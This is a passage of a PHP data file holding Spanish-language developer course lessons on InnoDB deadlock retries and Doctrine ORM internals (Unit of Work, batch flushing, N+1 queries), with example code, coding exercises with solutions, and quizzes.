                            'description' => 'Cuando la Transacción A espera el recurso de B y B espera el de A, InnoDB detecta el ciclo inmediatamente y aborta una de ellas con el error MySQL 1213 (ER_LOCK_DEADLOCK). La aplicación Senior debe capturar la excepción y reintentar automáticamente.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Database/Transaction/InventoryReservationService.php',
                    'title' => 'Reserva de Inventario con Bloqueo Pesimista y Reintento de Deadlocks',
                    'tag' => 'InnoDB ACID Concurrency',
                    'code' => "declare(strict_types=1);

namespace App\Database\Transaction;

use Doctrine\DBAL\Connection;
use Doctrine\DBAL\Exception\DeadlockException;
use RuntimeException;

class InventoryReservationService
{
    public function __construct(
        private readonly Connection \$connection
    ) {}

    public function reserveItemWithRetry(int \$itemId, int \$quantity, int \$maxRetries = 3): bool
    {
        \$attempt = 0;

        while (\$attempt < \$maxRetries) {
            \$attempt++;
            \$this->connection->beginTransaction();

            try {
                // Bloqueo pesimista exclusivo (X-Lock) sobre el registro del inventario
                \$sql = 'SELECT id, stock, reserved FROM inventory WHERE id = :id FOR UPDATE';
                \$item = \$this->connection->fetchAssociative(\$sql, ['id' => \$itemId]);

                if (!\$item) {
                    \$this->connection->rollBack();
                    throw new RuntimeException('Artículo de inventario no encontrado.');
                }

                \$availableStock = (int) \$item['stock'] - (int) \$item['reserved'];
                if (\$availableStock < \$quantity) {
                    \$this->connection->rollBack();
                    return false; // Stock insuficiente
                }

                // Mutación atómica dentro de la transacción protegida
                \$this->connection->executeStatement(
                    'UPDATE inventory SET reserved = reserved + :qty WHERE id = :id',
                    ['qty' => \$quantity, 'id' => \$itemId]
                );

                \$this->connection->commit();
                return true;
            } catch (DeadlockException \$e) {
                \$this->connection->rollBack();
                if (\$attempt >= \$maxRetries) {
                    throw \$e;
                }
                usleep((int) (pow(2, \$attempt) * 10000 + random_int(1000, 5000))); // Backoff con jitter
            } catch (\\Throwable \$e) {
                \$this->connection->rollBack();
                throw \$e;
            }
        }

        return false;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior sabe que un Deadlock en una base de datos de alto tráfico no es un "bug", sino un subproducto inevitable de la concurrencia y los bloqueos a nivel de fila. En lugar de entrar en pánico o desactivar transacciones, el Senior diseña la aplicación para que sea resiliente: transacciones lo más cortas posibles (nunca hacer peticiones HTTP o llamadas a Stripe dentro de un bloque transaccional) y envolver las operaciones críticas en un Retry Pattern.',
                    'critical_questions' => [
                        '¿Estamos realizando llamadas a APIs externas (Stripe, SendGrid) dentro de la transacción de base de datos bloqueando conexiones?',
                        '¿Las mutaciones de múltiples recursos se realizan siempre en el mismo orden determinista (ej. ordenar IDs ascendentemente) para reducir la probabilidad de deadlocks?',
                        '¿Debemos usar bloqueo pesimista (FOR UPDATE) o podemos utilizar bloqueo optimista mediante una columna version en la entidad?',
                        '¿Nuestra aplicación tiene un interceptor o middleware que capture el error 1213 de MySQL y reintente la operación de forma transparente?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Descontar 100 EUR del saldo de un usuario cuando solicita una compra.',
                    'junior' => [
                        'approach' => 'Lee el saldo: `$user = $repo->find($id); if ($user->getBalance() >= 100) { $user->setBalance($user->getBalance() - 100); $em->flush(); }` sin transacciones ni bloqueos explícitos.',
                        'flaws' => [
                            'Condición de carrera (Time-of-Check to Time-of-Use / TOCTOU): Si dos peticiones llegan al mismo milisegundo, ambas leen el saldo original y ambas aprueban el descuento.',
                            'El usuario gasta 200 EUR teniendo solo 100 EUR (saldo negativo ilegal en producción).',
                            'Sin consistencia transaccional.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Abre una transacción estricta. Bloquea la fila con `SELECT balance FROM user_wallet WHERE id = :id FOR UPDATE`. Verifica que balance >= 100. Ejecuta el débito atómico y hace `COMMIT`. Si MySQL detecta un deadlock, reintenta automáticamente.',
                        'rationale' => [
                            'Cero riesgo de sobregiro: la segunda transacción se bloquea en espera hasta que la primera completa el commit.',
                            'Consistencia absoluta garantizada por el motor InnoDB.',
                            'Tolerancia a fallos mediante Retry Pattern.',
                        ],
                        'trade_offs' => 'Introduce una breve cola de espera (espera de bloqueo) para operaciones simultáneas sobre la misma cuenta.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Coordinador Transaccional con Reintento ante Deadlocks',
                    'objective' => 'Implementar una clase TransactionRetryCoordinator que ejecute una operación transaccional y reintente automáticamente si se produce un Deadlock (error MySQL 1213 o mensaje conteniendo "deadlock").',
                    'instructions' => 'Implementa TransactionRetryCoordinator con el método executeWithRetry(callable $operation, int $maxRetries = 3): mixed. Si $operation() arroja una PDOException cuyo mensaje contenga "deadlock" o "1213" (sin importar mayúsculas), debe reintentar hasta $maxRetries veces esperando brevemente. Si se agotan los reintentos o la excepción es de otro tipo, debe relanzar la excepción.',
                    'filename' => 'TransactionRetryCoordinator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse PDOException;\nuse RuntimeException;\n\nclass TransactionRetryCoordinator\n{\n    /**\n     * @param callable(): mixed \$operation\n     */\n    public function executeWithRetry(callable \$operation, int \$maxRetries = 3): mixed\n    {\n        // TODO: Implementar bucle de reintentos hasta \$maxRetries\n        // Si se produce una PDOException de tipo deadlock (código 1213 o texto 'deadlock'), reintentar\n        // Si se agotan los intentos, relanzar la excepción\n        return null;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse PDOException;\nuse RuntimeException;\n\nclass TransactionRetryCoordinator\n{\n    /**\n     * @param callable(): mixed \$operation\n     */\n    public function executeWithRetry(callable \$operation, int \$maxRetries = 3): mixed\n    {\n        \$attempt = 0;\n\n        while (\$attempt < \$maxRetries) {\n            \$attempt++;\n            try {\n                return \$operation();\n            } catch (PDOException \$e) {\n                \$isDeadlock = str_contains(strtolower(\$e->getMessage()), 'deadlock')\n                    || str_contains(\$e->getMessage(), '1213');\n\n                if (\$isDeadlock && \$attempt < \$maxRetries) {\n                    usleep(1000 * \$attempt);\n                    continue;\n                }\n\n                throw \$e;\n            }\n        }\n\n        throw new RuntimeException('Número máximo de reintentos transaccionales excedido.');\n    }\n}\n",
                    'explanation' => 'En arquitecturas transaccionales de alto rendimiento, los deadlocks son anomalías estadísticas esperadas. Un coordinador de transacciones con reintento automático desacopla la resiliencia de la lógica de negocio, protegiendo al usuario de errores 500 transitorios.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Niveles de Aislamiento y Concurrencia en Bases de Datos',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué es una "Lectura Sucia" (Dirty Read) y qué nivel de aislamiento la permite?',
                            'options' => [
                                'a' => 'Ocurre cuando una transacción lee datos modificados por otra transacción concurrente que aún NO han sido confirmados (sin COMMIT); está permitida únicamente en READ UNCOMMITTED.',
                                'b' => 'Ocurre cuando una consulta SQL tiene errores de sintaxis.',
                                'c' => 'Ocurre cuando el servidor se queda sin espacio en disco duro.',
                                'd' => 'Es una lectura en modo seguro de InnoDB.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Una Lectura Sucia ocurre cuando la Transacción A lee un dato modificado por la Transacción B antes de que B haga COMMIT. Si B hace ROLLBACK, los datos leídos por A nunca existieron legalmente.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es el nivel de aislamiento por defecto en el motor InnoDB de MySQL y qué anomalía mitiga mediante Next-Key Locks?',
                            'options' => [
                                'a' => 'SERIALIZABLE; mitiga pérdidas de red.',
                                'b' => 'REPEATABLE READ; mitiga lecturas no repetibles y previene lecturas fantasma mediante bloqueos de rango (Gap Locks / Next-Key Locks).',
                                'c' => 'READ UNCOMMITTED; mitiga la memoria RAM.',
                                'd' => 'READ COMMITTED; mitiga bloqueos de tabla.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'MySQL InnoDB opera por defecto en REPEATABLE READ. Utiliza MVCC para lecturas consistentes y Next-Key Locking en lecturas bloqueantes para prevenir inserciones concurrentes en el rango consultado.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué un desarrollador Senior prohíbe terminantemente realizar llamadas HTTP o enviar correos electrónicos dentro de un bloque `START TRANSACTION` ... `COMMIT`?',
                            'options' => [
                                'a' => 'Porque el protocolo HTTP no soporta transacciones SQL.',
                                'b' => 'Porque las llamadas de red externas tienen latencias variables o pueden congelarse (timeouts de 5 a 30 segundos), manteniendo abiertas las conexiones de base de datos y los bloqueos a nivel de fila, agotando el pool de conexiones y provocando un bloqueo general del sistema.',
                                'c' => 'Porque MySQL desconecta el cable de red si detecta llamadas HTTP.',
                                'd' => 'Porque el comando COMMIT cancela las peticiones cURL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Las transacciones de base de datos deben ser ultrarrápidas (< 5ms). Incluir I/O de red externa mantiene los bloqueos de fila activos durante segundos, degradando la concurrencia y provocando una cascada de deadlocks y timeouts.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 6: DOCTRINE ORM INTERNALS & OPTIMIZACIÓN
            // ==========================================

            // ==========================================
            // NIVEL 6: LECCIÓN 1: Unit of Work & Identity Map Internals
            // ==========================================
            'doctrine-unit-of-work' => [
                'slug' => 'doctrine-unit-of-work',
                'title' => 'Unit of Work & Identity Map Internals',
                'module' => 'Doctrine ORM',
                'minutes' => 60,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Doctrine ORM implementa el patrón Data Mapper de Martin Fowler, distinguiéndose radicalmente de los ORMs de tipo Active Record. El núcleo de Doctrine está gobernado por dos componentes fundamentales: el UnitOfWork (UoW) y el IdentityMap. El IdentityMap garantiza que una entidad con un ID determinado solo exista una única vez en la memoria RAM del proceso PHP, preservando la identidad referencial estricta (\$a === \$b). El UnitOfWork rastrea las mutaciones de todas las entidades en estado Managed y, al ejecutar \$em->flush(), calcula el ChangeSet comparando los valores actuales con la fotografía original (originalEntityData), ordenando y ejecutando el lote mínimo de sentencias SQL en una única transacción de base de datos.',
                    'problem' => 'El antipatrón de invocar \$em->flush() dentro de bucles foreach (ej. al importar o procesar miles de registros). Cada llamada a flush() fuerza al UnitOfWork a recalcular el ChangeSet completo de todo el grafo de objetos en memoria y emitir consultas individuales a la base de datos, provocando fugas de memoria masivas, saturación de la CPU y caídas por memory_limit en entornos de producción.',
                    'solution' => 'Dominar los 4 estados de una entidad (New, Managed, Detached, Removed) y la gestión de memoria en procesamiento batch: agrupar mutaciones en lotes (batch processing de 50 o 100 elementos), invocar \$em->flush() al final de cada lote seguido inmediatamente de \$em->clear() para vaciar el Identity Map y liberar la memoria RAM de PHP. Comprender que \$em->persist() solo es necesario para entidades en estado New y nunca para entidades ya recuperadas de repositorios.',
                    'problem_label' => 'El Antipatrón de flush() en Bucles y Fuga Masiva de Memoria:',
                    'solution_label' => 'La Solución: Estados del UnitOfWork, Identity Map y Procesamiento Batch con clear():',
                ],
                'internals' => [
                    'title' => 'Los 4 Estados de Entidades y el Algoritmo de ChangeSet en flush()',
                    'steps' => [
                        [
                            'phase' => '1. Los 4 Estados del Ciclo de Vida de una Entidad',
                            'description' => 'New: objeto instanciado con new, sin ID persistido ni presencia en el Identity Map. Managed: entidad registrada en el Identity Map, cuyas mutaciones son rastreadas activamente. Detached: entidad con ID pero desvinculada del EntityManager (por \$em->clear() o deserialización). Removed: entidad programada para eliminación física en el próximo flush().',
                        ],
                        [
                            'phase' => '2. El Identity Map y Resolución O(1)',
                            'description' => 'El Identity Map es un mapa asociativo [ClassName][ID] => \$entity. Si una petición consulta al usuario 42 diez veces a través de repositorios distintos, Doctrine ejecuta la consulta SQL solo la primera vez; las 9 restantes se resuelven en memoria en O(1), garantizando consistencia absoluta.',
                        ],
                        [
                            'phase' => '3. El Algoritmo de ChangeSet en \$em->flush()',
                            'description' => 'Al llamar a flush(), el UnitOfWork itera las entidades Managed, compara cada propiedad contra el originalEntityData guardado al hidratar, y calcula el ChangeSet. Si ninguna propiedad cambió, no emite ninguna sentencia UPDATE.',
                        ],
                        [
                            'phase' => '4. Orden de Ejecución Transaccional',
                            'description' => 'El UnitOfWork agrupa y ejecuta las consultas en un orden estricto para respetar claves foráneas: primero INSERTs, luego UPDATEs, actualizaciones de colecciones y finalmente DELETEs, todo dentro de una transacción implícita.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Database/Batch/BatchUserProcessor.php',
                    'title' => 'Procesador Batch con Manejo Eficiente de Memoria en Doctrine ORM',
                    'tag' => 'Doctrine UnitOfWork Batch Processing',
                    'code' => "declare(strict_types=1);

namespace App\Database\Batch;

use App\Entity\User;
use Doctrine\ORM\EntityManagerInterface;

class BatchUserProcessor
{
    private const BATCH_SIZE = 100;

    public function __construct(
        private readonly EntityManagerInterface \$entityManager
    ) {}

    /**
     * Procesa usuarios en lotes cerrados, purgando el Identity Map para mantener memoria O(1).
     *
     * @param iterable<array{email: string, xp: int}> \$records
     * @return int Total de registros persistidos
     */
    public function importUsers(iterable \$records): int
    {
        \$count = 0;

        foreach (\$records as \$record) {
            \$user = new User();
            \$user->setEmail(\$record['email']);
            \$user->addExperiencePoints(\$record['xp']);

            // Pasa de estado 'New' a 'Managed'
            \$this->entityManager->persist(\$user);
            \$count++;

            // Cada BATCH_SIZE elementos: vuelca a base de datos y vacía el Identity Map
            if (\$count % self::BATCH_SIZE === 0) {
                \$this->entityManager->flush();
                \$this->entityManager->clear(); // Libera todas las entidades Managed de RAM
            }
        }

        // Vuelca los elementos remanentes del último lote incompleto
        if (\$count % self::BATCH_SIZE !== 0) {
            \$this->entityManager->flush();
            \$this->entityManager->clear();
        }

        return \$count;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior no trata a Doctrine como una caja negra de persistencia mágica. Sabe con exactitud cuántos objetos residen en el Identity Map en todo momento. Si una tarea CLI o worker procesa 50,000 registros, el Senior nunca permite que el EntityManager retenga más de 100 objetos simultáneamente. Cada `flush()` seguido de `clear()` resetea el grafo de entidades, manteniendo el consumo de memoria plano en menos de 30MB en lugar de consumir 2GB de RAM.',
                    'critical_questions' => [
                        '¿Estamos invocando \$em->persist() sobre una entidad que ya fue recuperada del repositorio y por tanto ya está en estado Managed?',
                        '¿Este comando de importación masiva ejecuta \$em->clear() periódicamente para evitar saturar el Identity Map?',
                        '¿Qué entidades quedan en estado Detached después de invocar \$em->clear() y cómo afecta a referencias posteriores en el código?',
                        '¿Podemos utilizar consultas DQL masivas (UPDATE ... WHERE) en lugar de hidratar miles de entidades para actualizar un solo campo?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Actualizar el estado de 20,000 usuarios inactivos marcando su estado como SUSPENDED.',
                    'junior' => [
                        'approach' => 'Recupera los 20,000 usuarios con `$repo->findBy(["status" => "INACTIVE"])`. Itera el array: `$user->setStatus("SUSPENDED"); $em->flush();` en cada vuelta del bucle.',
                        'flaws' => [
                            'Hidrata 20,000 entidades completas en memoria RAM consumiendo más de 400MB.',
                            'Ejecuta 20,000 sentencias SQL UPDATE individuales y 20,000 cálculos de ChangeSet completos.',
                            'El script tarda más de 8 minutos y aborta con Fatal Error: Allowed memory size exhausted.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Opción 1: Consulta masiva DQL directa `UPDATE App\Entity\User u SET u.status = :newStatus WHERE u.status = :oldStatus` ejecutada en 1 sola sentencia SQL de 15 milisegundos. Opción 2 si hay eventos de dominio: iteración en cursor paginado con `q->toIterable()`, procesamiento en lotes de 100 con `flush()` y `clear()`.',
                        'rationale' => [
                            'Consumo de memoria O(1) constante (< 25MB).',
                            'Tiempo de ejecución reducido de 8 minutos a menos de 300 milisegundos.',
                            'Cero riesgo de sobrecarga del servidor de base de datos.',
                        ],
                        'trade_offs' => 'Las consultas DQL masivas omiten el ciclo de eventos del UnitOfWork de Doctrine (Lifecycle Callbacks), requiriendo despachar eventos manualmente si son necesarios.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Gestor de Lotes Transaccionales con Control de Memoria',
                    'objective' => 'Implementar una clase BatchFlushCoordinator que procese una colección iterable en lotes de tamaño configurable, ejecutando flush() y clear() en los puntos de corte para evitar fugas de memoria.',
                    'instructions' => 'Implementa BatchFlushCoordinator con el constructor recibiendo opcionalmente ?EntityManagerInterface $entityManager, y el método processInBatches(iterable $items, callable $worker, int $batchSize = 100): int. Si $batchSize <= 0, lanza una InvalidArgumentException. Itera los items ejecutando $worker($item) y, cada $batchSize elementos (y al final para los remanentes), invoca $this->entityManager?->flush() y $this->entityManager?->clear(). Retorna el total de items procesados.',
                    'filename' => 'BatchFlushCoordinator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Doctrine\\ORM\\EntityManagerInterface;\nuse InvalidArgumentException;\n\nclass BatchFlushCoordinator\n{\n    public function __construct(\n        private readonly ?EntityManagerInterface \$entityManager = null\n    ) {}\n\n    /**\n     * @param iterable<mixed> \$items\n     * @param callable(mixed): void \$worker\n     */\n    public function processInBatches(iterable \$items, callable \$worker, int \$batchSize = 100): int\n    {\n        // TODO: Validar que \$batchSize > 0 o lanzar InvalidArgumentException\n        // TODO: Iterar \$items, ejecutar \$worker(\$item) y contabilizar\n        // TODO: Cada \$batchSize y al finalizar elementos remanentes, invocar flush() y clear()\n        // Retornar el total de elementos procesados\n        return 0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Doctrine\\ORM\\EntityManagerInterface;\nuse InvalidArgumentException;\n\nclass BatchFlushCoordinator\n{\n    public function __construct(\n        private readonly ?EntityManagerInterface \$entityManager = null\n    ) {}\n\n    /**\n     * @param iterable<mixed> \$items\n     * @param callable(mixed): void \$worker\n     */\n    public function processInBatches(iterable \$items, callable \$worker, int \$batchSize = 100): int\n    {\n        if (\$batchSize <= 0) {\n            throw new InvalidArgumentException('El tamaño de lote debe ser mayor a 0.');\n        }\n\n        \$count = 0;\n\n        foreach (\$items as \$item) {\n            \$worker(\$item);\n            \$count++;\n\n            if (\$count % \$batchSize === 0) {\n                \$this->entityManager?->flush();\n                \$this->entityManager?->clear();\n            }\n        }\n\n        if (\$count > 0 && \$count % \$batchSize !== 0) {\n            \$this->entityManager?->flush();\n            \$this->entityManager?->clear();\n        }\n\n        return \$count;\n    }\n}\n",
                    'explanation' => 'Al intercalar llamadas periódicas a flush() y clear() en procesos por lotes, vaciamos el Identity Map del UnitOfWork de Doctrine. Esto permite que el Garbage Collector de PHP destruya las instancias procesadas, manteniendo el consumo de memoria completamente plano.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Unit of Work, Identity Map y Ciclo de Vida en Doctrine',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué garantiza el patrón Identity Map implementado en el UnitOfWork de Doctrine dentro de una misma petición?',
                            'options' => [
                                'a' => 'Que todas las entidades tengan nombres únicos en inglés.',
                                'b' => 'Que una entidad con un ID primario específico esté instanciada exactamente una única vez en memoria RAM, de modo que consultas independientes al mismo ID devuelvan la misma referencia exacta de objeto ($a === $b).',
                                'c' => 'Que la base de datos no permita registros duplicados mediante índices UNIQUE.',
                                'd' => 'Que las contraseñas se almacenen cifradas con Argon2id.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El Identity Map actúa como una caché de identidad en memoria durante el ciclo de vida de la petición: impide que existan dos instancias en memoria que representen la misma fila de base de datos, garantizando integridad referencial.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué ocurre con las entidades que estaban en estado `Managed` cuando se ejecuta `$entityManager->clear()`?',
                            'options' => [
                                'a' => 'Se eliminan de la base de datos con una sentencia SQL DELETE.',
                                'b' => 'Pasan al estado `Detached`: se eliminan del Identity Map y el UnitOfWork deja de rastrear sus cambios.',
                                'c' => 'Se convierten automáticamente en arrays JSON.',
                                'd' => 'Se reinicia el servidor web Nginx.',
                            ],
                            'correct' => 'b',
                            'explanation' => '$em->clear() desconecta todas las entidades del EntityManager pasando su estado a Detached. Cualquier mutación posterior sobre esas instancias será ignorada por flush() a menos que se vuelvan a asociar.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué llamar a `$entityManager->persist($entity)` sobre una entidad que ya fue recuperada mediante `$repository->find($id)` es redundante e innecesario?',
                            'options' => [
                                'a' => 'Porque las entidades recuperadas de repositorios ya se encuentran en estado `Managed` y el UnitOfWork ya rastrea automáticamente sus mutaciones para el próximo flush().',
                                'b' => 'Porque find() desactiva el UnitOfWork.',
                                'c' => 'Porque persist() solo funciona en bases de datos PostgreSQL.',
                                'd' => 'Porque persist() elimina la entidad si ya tiene ID.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'En Doctrine, persist() solo tiene como propósito notificar al EntityManager que un objeto en estado New debe ser gestionado (Managed). Las entidades obtenidas de consultas ya son Managed; solo basta modificar sus propiedades y ejecutar flush().',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 6: LECCIÓN 2: Detección & Mitigación de Queries N+1
            // ==========================================
            'doctrine-n-plus-one-optimization' => [
                'slug' => 'doctrine-n-plus-one-optimization',
                'title' => 'Detección & Mitigación de Queries N+1',
                'module' => 'Doctrine ORM',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El problema de consultas N+1 es el antipatrón de rendimiento más dañino en aplicaciones empresariales con ORMs. Ocurre cuando se ejecuta 1 consulta inicial para obtener N registros principales (ej. 100 facturas) y luego, al iterar el resultado y acceder a una relación perezosa (Lazy Loaded) como \$invoice->getCustomer()->getName(), Doctrine dispara N consultas SQL secundarias adicionales individuales (1 + 100 = 101 consultas). Una operación que debió resolverse en 1 sola consulta con JOIN satura la base de datos con cientos de viajes de red innecesarios.',
                    'problem' => 'La falsa solución de configurar las relaciones con fetch: \"EAGER\" en los metadatos de las entidades. Esto es una trampa arquitectónica fatal: EAGER obliga a Doctrine a cargar la relación SIEMPRE en cualquier consulta en todo el sistema, inflando el consumo de memoria y degradando consultas que no necesitaban esos datos relacionados.',
                    'solution' => 'Mantener todas las relaciones con fetch: \"LAZY\" por defecto en los mapeos, y resolver el N+1 a nivel de caso de uso: utilizar DQL explícito con JOIN FETCH para hidratar entidades y colaboradores en 1 sola consulta (SELECT o, c FROM Order o JOIN o.customer c), paginación segura con Doctrine\\ORM\\Tools\\Pagination\\Paginator para colecciones OneToMany, o Proyecciones DTO directas (SELECT NEW App\\DTO\\OrderListDto(...)) para listados de solo lectura de máxima velocidad.',
                    'problem_label' => 'El Antipatrón de Lazy Loading en Bucles y la Trampa de fetch: EAGER:',
                    'solution_label' => 'La Solución: Relaciones LAZY con JOIN FETCH en DQL y Proyecciones DTO:',
                ],
                'internals' => [
                    'title' => 'Mecánica del Proxy Pattern, Lazy Loading y Paginación Segura',
                    'steps' => [
                        [
                            'phase' => '1. El Patrón Proxy en Doctrine',
                            'description' => 'Al cargar una entidad con relación ManyToOne perezosa, Doctrine no consulta la tabla relacionada de inmediato: inyecta un Proxy dinámico que solo almacena el ID foráneo. Al invocar cualquier método getter, el proxy intercepta la llamada y dispara el SELECT perezoso.',
                        ],
                        [
                            'phase' => '2. Multiplicación de Consultas en Bucles (N+1)',
                            'description' => 'Si se itera una colección de 50 pedidos y en cada uno se accede al cliente, el proxy se inicializa 50 veces, generando 50 viajes de red individuales de 2ms cada uno, disparando la latencia de 5ms a más de 105ms.',
                        ],
                        [
                            'phase' => '3. DQL con JOIN FETCH',
                            'description' => 'Al escribir SELECT o, c FROM Order o JOIN o.customer c, Doctrine incluye los campos del cliente en la cláusula SELECT de SQL y los une con INNER JOIN, hidratando ambas entidades completas en una única consulta.',
                        ],
                        [
                            'phase' => '4. Paginación Segura con Paginator',
                            'description' => 'Al usar JOIN en relaciones OneToMany, un LIMIT estándar en SQL corta filas de items secundarios en lugar de pedidos principales. Doctrine Paginator ejecuta una subconsulta de IDs únicos antes de traer la colección completa, garantizando límites exactos.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Database/Repository/InvoiceOptimizedRepository.php',
                    'title' => 'Repositorio con JOIN FETCH y Proyección DTO contra Queries N+1',
                    'tag' => 'Doctrine Anti-N+1 Strategy',
                    'code' => "declare(strict_types=1);

namespace App\Database\Repository;

use App\DTO\InvoiceListDto;
use App\Entity\Invoice;
use Doctrine\Bundle\DoctrineBundle\Repository\ServiceEntityRepository;
use Doctrine\ORM\Tools\Pagination\Paginator;
use Doctrine\Persistence\ManagerRegistry;

/**
 * @extends ServiceEntityRepository<Invoice>
 */
class InvoiceOptimizedRepository extends ServiceEntityRepository
{
    public function __construct(ManagerRegistry \$registry)
    {
        parent::__construct(\$registry, Invoice::class);
    }

    /**
     * Resuelve N+1 mediante DQL JOIN FETCH con soporte de paginación segura.
     * Carga facturas, clientes y líneas en 1 sola consulta SQL principal.
     */
    public function findPaginatedInvoicesWithRelations(int \$page = 1, int \$limit = 20): Paginator
    {
        \$dql = '
            SELECT inv, c, lines
            FROM App\Entity\Invoice inv
            JOIN inv.customer c
            LEFT JOIN inv.lines lines
            ORDER BY inv.createdAt DESC
        ';

        \$query = \$this->getEntityManager()
            ->createQuery(\$dql)
            ->setFirstResult((\$page - 1) * \$limit)
            ->setMaxResults(\$limit);

        return new Paginator(\$query, fetchJoinCollection: true);
    }

    /**
     * Proyección DTO de solo lectura: máxima velocidad sin sobrecosto de hidratación de entidades.
     *
     * @return list<InvoiceListDto>
     */
    public function findInvoiceDtosForListing(): array
    {
        \$dql = '
            SELECT NEW App\DTO\InvoiceListDto(
                inv.id,
                inv.referenceNumber,
                c.companyName,
                inv.totalCents,
                inv.createdAt
            )
            FROM App\Entity\Invoice inv
            JOIN inv.customer c
            ORDER BY inv.createdAt DESC
        ';

        return \$this->getEntityManager()
            ->createQuery(\$dql)
            ->setMaxResults(50)
            ->getResult();
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior inspecciona la barra de herramientas del Symfony Web Profiler tras construir cualquier endpoint o vista. Si la pestaña de base de datos reporta más de 10 consultas SQL para renderizar una página, salta una alarma inmediata de N+1. El Senior nunca recurre a fetch: \"EAGER\" en la entidad; en su lugar, analiza qué caso de uso necesita esos colaboradores y escribe una consulta DQL específica con JOIN FETCH o diseña una proyección a DTO si la vista es de solo lectura.',
                    'critical_questions' => [
                        '¿Cuántas consultas SQL reporta el Profiler de Symfony para este endpoint en condiciones reales?',
                        '¿Estamos utilizando fetch: \"EAGER\" en la entidad, castigando el rendimiento de otros 15 endpoints que no necesitan esa relación?',
                        '¿Esta consulta de listado requiere hidratar entidades gestionadas por el UnitOfWork o podemos usar una proyección SELECT NEW a DTO?',
                        '¿Estamos utilizando Doctrine Paginator con fetchJoinCollection: true para evitar cortes corruptos de relaciones OneToMany con LIMIT?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Listar las últimas 50 órdenes de compra mostrando el nombre del cliente y la cantidad de productos en cada orden.',
                    'junior' => [
                        'approach' => 'Usa `$orderRepo->findBy([], ["id" => "DESC"], 50)`. En Twig itera: `{{ order.customer.name }}` y `{{ order.items|length }}`. Al ver que tarda mucho, cambia la entidad a `fetch: "EAGER"` en customer e items.',
                        'flaws' => [
                            'Inicialmente dispara 101 consultas SQL individuales.',
                            'Al poner fetch: "EAGER", cualquier `$em->find(Order::class, $id)` en un worker CLI o API liviana ahora carga forzosamente todas las colecciones y clientes, triplicando el consumo de memoria en todo el sistema.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Mantiene `fetch: "LAZY"` en la entidad. Para la vista de listado escribe una consulta DQL con `JOIN FETCH`: `SELECT o, c, i FROM App\Entity\Order o JOIN o.customer c LEFT JOIN o.items i` o proyecta a un DTO de lectura.',
                        'rationale' => [
                            '1 sola consulta SQL optimizada.',
                            'Cero impacto negativo en el resto de la aplicación.',
                            'Cero proxies inicializados en caliente.',
                        ],
                        'trade_offs' => 'Requiere definir métodos de repositorio específicos para consultas complejas en lugar de apoyarse en findBy().',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: DQL Builder con Eager Join Fetching',
                    'objective' => 'Implementar una clase OptimizedDqlQueryBuilder que construya sentencias DQL unificadas con JOIN FETCH para erradicar consultas N+1 en colecciones relacionadas.',
                    'instructions' => 'Implementa OptimizedDqlQueryBuilder con el método buildJoinFetchDql(string $rootEntity, string $rootAlias, array $joins): string. Si $joins está vacío, lanza una InvalidArgumentException. Construye la sentencia DQL seleccionando el alias raíz y todos los alias unidos, con cláusulas INNER JOIN {$rootAlias}.{$relation} {$alias}. Retorna el string DQL completo (ej. "SELECT o, c, i FROM Order o INNER JOIN o.customer c INNER JOIN o.items i").',
                    'filename' => 'OptimizedDqlQueryBuilder.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass OptimizedDqlQueryBuilder\n{\n    /**\n     * @param array<string, string> \$joins Array asociativo [relacion => alias]\n     */\n    public function buildJoinFetchDql(string \$rootEntity, string \$rootAlias, array \$joins): string\n    {\n        // TODO: Validar que \$joins no esté vacío o lanzar InvalidArgumentException\n        // TODO: Construir cláusula SELECT con \$rootAlias y todos los alias de \$joins\n        // TODO: Construir cláusulas INNER JOIN {\$rootAlias}.{\$relation} {\$alias}\n        // Retornar sentencia DQL final\n        return '';\n    }\n}\n",
